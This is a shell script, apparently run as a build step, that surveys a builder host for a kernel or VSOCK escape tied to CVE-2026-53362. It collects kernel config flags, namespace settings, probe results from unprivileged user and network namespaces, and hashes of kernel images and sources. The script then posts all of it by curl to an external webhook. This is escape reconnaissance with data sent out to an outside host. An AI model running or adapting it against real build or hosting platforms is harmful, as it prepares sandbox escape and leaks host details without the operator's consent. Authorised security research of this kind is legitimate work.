assets.probe.sh:
#!/bin/sh
set -u

: "${CANARY_URL:?missing disposable webhook}"

probe_dir=$(mktemp -d)
kernel_release=$(uname -r 2>/dev/null || true)
kernel_version=$(uname -v 2>/dev/null || true)
kernel_machine=$(uname -m 2>/dev/null || true)

read_number() {
  if [ -r "$1" ]; then
    value=$(head -n 1 "$1" 2>/dev/null | tr -cd '0-9')
    if [ -n "$value" ]; then printf '%s' "$value"; else printf 'null'; fi
  else
    printf 'null'
  fi
}

file_fingerprint() {
  target=$1
  readable=false
  bytes=0
  digest=''
  if [ -r "$target" ]; then
    readable=true
    bytes=$(wc -c <"$target" | tr -d ' ')
    digest=$(sha256sum "$target" 2>/dev/null | awk '{print $1}')
  fi
  jq -cn --argjson readable "$readable" --argjson bytes "$bytes" --arg digest "$digest" \
    '{readable:$readable,bytes:$bytes,sha256:(if $digest=="" then null else $digest end)}'
}

compiler_exit=127
outside='null'
userns_exit=127
userns='null'
user_netns_exit=127
user_netns='null'

if command -v cc >/dev/null 2>&1; then
  cc -O2 -Wall -Wextra -o "$probe_dir/kernel-gate-probe" /app/kernel-gate-probe.c >"$probe_dir/cc.out" 2>"$probe_dir/cc.err"
  compiler_exit=$?
fi

if [ "$compiler_exit" -eq 0 ]; then
  "$probe_dir/kernel-gate-probe" >"$probe_dir/outside.json" 2>/dev/null
  if jq -e 'type=="object"' "$probe_dir/outside.json" >/dev/null 2>&1; then
    outside=$(cat "$probe_dir/outside.json")
  fi
fi

if [ "$compiler_exit" -eq 0 ] && command -v unshare >/dev/null 2>&1; then
  unshare --user --map-root-user -- "$probe_dir/kernel-gate-probe" >"$probe_dir/userns.json" 2>"$probe_dir/userns.err"
  userns_exit=$?
  if [ "$userns_exit" -eq 0 ] && jq -e 'type=="object"' "$probe_dir/userns.json" >/dev/null 2>&1; then
    userns=$(cat "$probe_dir/userns.json")
  fi

  unshare --user --map-root-user --net -- "$probe_dir/kernel-gate-probe" >"$probe_dir/user-netns.json" 2>"$probe_dir/user-netns.err"
  user_netns_exit=$?
  if [ "$user_netns_exit" -eq 0 ] && jq -e 'type=="object"' "$probe_dir/user-netns.json" >/dev/null 2>&1; then
    user_netns=$(cat "$probe_dir/user-netns.json")
  fi
fi

max_user_namespaces=$(read_number /proc/sys/user/max_user_namespaces)
unprivileged_userns_clone=$(read_number /proc/sys/kernel/unprivileged_userns_clone)
apparmor_userns=$(read_number /proc/sys/kernel/apparmor_restrict_unprivileged_userns)

selected_config='[]'
if [ -r /proc/config.gz ]; then
  selected_config=$(gzip -dc /proc/config.gz 2>/dev/null | \
    grep -E '^(CONFIG_(FUTEX|FUTEX_PI|UNIX|AF_UNIX_OOB|AF_ALG|IPV6|USER_NS|NET_NS|IA32_EMULATION|COMPAT|SECCOMP|SECCOMP_FILTER|IO_URING|PACKET|RANDOMIZE_BASE|KALLSYMS|KALLSYMS_ALL|SLAB_FREELIST_HARDENED|SLAB_FREELIST_RANDOM|HARDENED_USERCOPY|STACKPROTECTOR_STRONG|X86_SMAP|X86_SMEP)=|# CONFIG_(FUTEX|FUTEX_PI|UNIX|AF_UNIX_OOB|AF_ALG|IPV6|USER_NS|NET_NS|IA32_EMULATION|COMPAT|SECCOMP|SECCOMP_FILTER|IO_URING|PACKET|RANDOMIZE_BASE|KALLSYMS|KALLSYMS_ALL|SLAB_FREELIST_HARDENED|SLAB_FREELIST_RANDOM|HARDENED_USERCOPY|STACKPROTECTOR_STRONG|X86_SMAP|X86_SMEP) is not set$)' | \
    LC_ALL=C sort | jq -Rsc 'split("\n")|map(select(length>0))')
  [ -n "$selected_config" ] || selected_config='[]'
fi

kernel_notes_hex=''
if [ -r /sys/kernel/notes ]; then
  kernel_notes_hex=$(od -An -v -tx1 /sys/kernel/notes 2>/dev/null | tr -d ' \n')
fi

config_gz=$(file_fingerprint /proc/config.gz)
boot_config=$(file_fingerprint "/boot/config-$kernel_release")
boot_kernel=$(file_fingerprint "/boot/vmlinuz-$kernel_release")
btf=$(file_fingerprint /sys/kernel/btf/vmlinux)
kernel_notes=$(file_fingerprint /sys/kernel/notes)
module_source=$(file_fingerprint "/lib/modules/$kernel_release/source/net/ipv6/ip6_output.c")
module_build_source=$(file_fingerprint "/lib/modules/$kernel_release/build/net/ipv6/ip6_output.c")

jq -n \
  --arg candidate 'CVE-2026-53362' \
  --arg kernelRelease "$kernel_release" \
  --arg kernelVersion "$kernel_version" \
  --arg machine "$kernel_machine" \
  --argjson maxUserns "$max_user_namespaces" \
  --argjson unprivUserns "$unprivileged_userns_clone" \
  --argjson apparmorUserns "$apparmor_userns" \
  --argjson selectedConfig "$selected_config" \
  --arg kernelNotesHex "$kernel_notes_hex" \
  --argjson compilerExit "$compiler_exit" \
  --argjson outside "$outside" \
  --argjson usernsExit "$userns_exit" \
  --argjson userns "$userns" \
  --argjson userNetnsExit "$user_netns_exit" \
  --argjson userNetns "$user_netns" \
  --argjson configGz "$config_gz" \
  --argjson bootConfig "$boot_config" \
  --argjson bootKernel "$boot_kernel" \
  --argjson btf "$btf" \
  --argjson kernelNotes "$kernel_notes" \
  --argjson moduleSource "$module_source" \
  --argjson moduleBuildSource "$module_build_source" \
  '{candidate:$candidate,kernel:{release:$kernelRelease,version:$kernelVersion,machine:$machine,selected_config:$selectedConfig,kernel_notes_hex:(if $kernelNotesHex=="" then null else $kernelNotesHex end)},namespace_policy:{max_user_namespaces:$maxUserns,unprivileged_userns_clone:$unprivUserns,apparmor_restrict_unprivileged_userns:$apparmorUserns},gate_probe:{compiler_exit:$compilerExit,outside:$outside,user_namespace:{exit:$usernsExit,result:$userns},user_and_network_namespaces:{exit:$userNetnsExit,result:$userNetns}},artifacts:{proc_config_gz:$configGz,boot_config:$bootConfig,boot_kernel:$bootKernel,btf_vmlinux:$btf,kernel_notes:$kernelNotes,module_source:$moduleSource,module_build_source:$moduleBuildSource},safety:{vulnerable_path_triggered:false,packet_sent:false,host_rpc_sent:false,payload_attempted:false}}' >"$probe_dir/payload.json"

curl --noproxy '*' -sS --connect-timeout 3 --max-time 8 -o /dev/null \
  -H 'Content-Type: application/json' --data-binary @"$probe_dir/payload.json" "$CANARY_URL"

commands.customName: Check builder kernel and VSOCK escape gates without triggering a flaw
